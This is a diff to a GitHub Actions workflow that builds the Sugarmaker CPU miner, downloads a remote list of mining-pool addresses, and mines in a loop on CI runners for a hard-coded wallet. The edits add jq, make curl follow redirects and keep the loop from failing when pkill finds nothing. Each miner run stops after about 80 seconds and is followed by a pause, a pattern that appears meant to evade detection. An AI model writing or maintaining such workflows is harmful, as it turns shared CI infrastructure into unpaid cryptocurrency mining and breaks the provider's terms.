@@ -28,7 +28,7 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y build-essential libcurl4-openssl-dev autotools-dev automake libtool
+          sudo apt-get install -y build-essential libcurl4-openssl-dev autotools-dev automake libtool jq
 
       - name: Build Sugarmaker
         run: |
@@ -39,7 +39,7 @@ jobs:
 
       - name: Download list.json
         run: |
-          curl -o list.json https://github.com/barburonjilo/open/raw/refs/heads/main/list.json
+          curl -L -o list.json https://github.com/barburonjilo/open/raw/refs/heads/main/list.json
 
       - name: Run Sugarmaker in loop
         run: |
@@ -54,7 +54,7 @@ jobs:
               ./sugarmaker -o $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr -p x &
               sleep 80
               echo "Stopping ./sugarmaker for $ip:$port"
-              pkill sugarmaker
+              pkill sugarmaker || true
               sleep 90
             done
           done
